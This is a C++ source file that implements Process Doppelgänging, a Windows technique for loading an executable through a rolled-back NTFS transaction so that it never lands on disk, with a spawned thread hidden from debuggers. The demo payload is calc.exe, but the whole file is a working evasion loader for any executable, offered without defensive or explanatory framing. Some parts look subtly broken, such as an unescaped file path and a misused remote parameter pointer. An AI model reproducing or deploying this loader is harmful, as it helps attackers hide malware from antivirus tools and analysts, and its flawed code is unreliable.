// Extended x64-compatible Process Doppelgänging with more NT internals
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#pragma comment(lib, "KtmW32.lib")

// Extra macro definitions to make top section heavier
#define DEREF(name) *(ULONG_PTR*)(name)
#define DEREF_64(name) *(DWORD64*)(name)
#define DEREF_32(name) *(DWORD*)(name)
#define DEREF_16(name) *(WORD*)(name)
#define DEREF_8(name)  *(BYTE*)(name)
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define PS_INHERIT_HANDLES 4
#define STATUS_SUCCESS 0x00000000
#define SEC_IMAGE 0x1000000
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 0x00000002
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004
#define MEM_EXECUTE_FLAGS (PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define InitializeObjectAttributes(p,n,a,r,s) \
    { (p)->Length = sizeof(*p); (p)->RootDirectory = r; (p)->Attributes = a; \
      (p)->ObjectName = n; (p)->SecurityDescriptor = s; (p)->SecurityQualityOfService = NULL; }

using namespace std;

// Structures
typedef struct _UNICODE_STRING { USHORT Length, MaximumLength; PWSTR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor, SecurityQualityOfService; } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef struct _PROCESS_BASIC_INFORMATION { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } PROCESS_BASIC_INFORMATION;
typedef struct _PEB { BYTE Reserved[0x18]; PVOID ImageBaseAddress; PVOID ProcessParameters; } PEB;

// Undocumented NT API typedefs
typedef NTSTATUS(NTAPI* _NtCreateTransaction)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
typedef NTSTATUS(NTAPI* _NtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* _NtRollbackTransaction)(HANDLE, BOOLEAN);
typedef NTSTATUS(NTAPI* _NtCreateProcessEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);
typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef PIMAGE_NT_HEADERS(NTAPI* _RtlImageNtHeader)(PVOID);
typedef NTSTATUS(NTAPI* _RtlCreateProcessParametersEx)(PRTL_USER_PROCESS_PARAMETERS*, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PVOID, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, ULONG);
typedef VOID(NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, LPTHREAD_START_ROUTINE, PVOID, BOOL, ULONG, ULONG, ULONG, PVOID);
typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* _NtResumeThread)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI* _NtSetInformationThread)(HANDLE, ULONG, PVOID, ULONG);

// API Globals
_NtCreateTransaction NtCreateTransaction;
_NtCreateSection NtCreateSection;
_NtRollbackTransaction NtRollbackTransaction;
_NtCreateProcessEx NtCreateProcessEx;
_NtQueryInformationProcess NtQueryInformationProcess;
_NtReadVirtualMemory NtReadVirtualMemory;
_RtlImageNtHeader RtlImageNtHeader;
_RtlCreateProcessParametersEx RtlCreateProcessParametersEx;
_RtlInitUnicodeString RtlInitUnicodeString;
_NtCreateThreadEx NtCreateThreadEx;
_NtAllocateVirtualMemory NtAllocateVirtualMemory;
_NtWriteVirtualMemory NtWriteVirtualMemory;
_NtResumeThread NtResumeThread;
_NtSetInformationThread NtSetInformationThread;

void LoadNtAPIs() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    NtCreateTransaction = (_NtCreateTransaction)GetProcAddress(ntdll, "NtCreateTransaction");
    NtCreateSection = (_NtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    NtRollbackTransaction = (_NtRollbackTransaction)GetProcAddress(ntdll, "NtRollbackTransaction");
    NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(ntdll, "NtCreateProcessEx");
    NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
    RtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(ntdll, "RtlImageNtHeader");
    RtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(ntdll, "RtlCreateProcessParametersEx");
    RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
    NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    NtResumeThread = (_NtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
    NtSetInformationThread = (_NtSetInformationThread)GetProcAddress(ntdll, "NtSetInformationThread");
}

BYTE* ReadPayloadFile(LPCWSTR path, DWORD& outSize) {
    HANDLE hFile = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    outSize = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, outSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD read = 0; ReadFile(hFile, buffer, outSize, &read, NULL); CloseHandle(hFile);
    return buffer;
}

HANDLE CreateTxSection(BYTE* buffer, DWORD size, HANDLE& tx) {
    OBJECT_ATTRIBUTES oa{};
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    NtCreateTransaction(&tx, TRANSACTION_ALL_ACCESS, &oa, NULL, NULL, 0, 0, 0, NULL, NULL);

    HANDLE hFile = CreateFileTransactedW(L"C:\Users\Public\senyazcan.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL, tx, NULL, NULL);
    DWORD written = 0; WriteFile(hFile, buffer, size, &written, NULL);

    HANDLE section = NULL;
    NtCreateSection(&section, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);
    return section;
}

void RunDoppelganging(HANDLE hSection, BYTE* payload) {
    HANDLE hProcess = NULL;
    NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);

    PROCESS_BASIC_INFORMATION pbi{};
    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    BYTE peb[0x1000] = {};
    NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, peb, sizeof(peb), NULL);

    ULONG_PTR base = (ULONG_PTR)((PEB*)peb)->ImageBaseAddress;
    ULONG_PTR ep = RtlImageNtHeader(payload)->OptionalHeader.AddressOfEntryPoint + base;

    UNICODE_STRING uPath; RtlInitUnicodeString(&uPath, L"C:\\temp\\dummy64.exe");
    PVOID remoteParams = NULL;
    RtlCreateProcessParametersEx((PRTL_USER_PROCESS_PARAMETERS*)&remoteParams, &uPath, NULL, NULL, &uPath, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);

    SIZE_T paramSize = ((PRTL_USER_PROCESS_PARAMETERS)remoteParams)->MaximumLength + ((PRTL_USER_PROCESS_PARAMETERS)remoteParams)->EnvironmentSize;
    NtAllocateVirtualMemory(hProcess, &remoteParams, 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NtWriteVirtualMemory(hProcess, remoteParams, remoteParams, paramSize, NULL);
    WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, ProcessParameters), &remoteParams, sizeof(PVOID), NULL);

    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)ep, NULL, TRUE, 0, 0, 0, NULL);
    NtSetInformationThread(hThread, 0x11, NULL, 0); // ThreadHideFromDebugger
    NtResumeThread(hThread, NULL);
}

int main() {
    LoadNtAPIs(); DWORD size = 0;
    BYTE* payload = ReadPayloadFile(L"C:\\Windows\\System32\\calc.exe", size);
    HANDLE tx = NULL;
    HANDLE section = CreateTxSection(payload, size, tx);
    NtRollbackTransaction(tx, TRUE); CloseHandle(tx);
    RunDoppelganging(section, payload);
    system("pause");
    return 0;
}
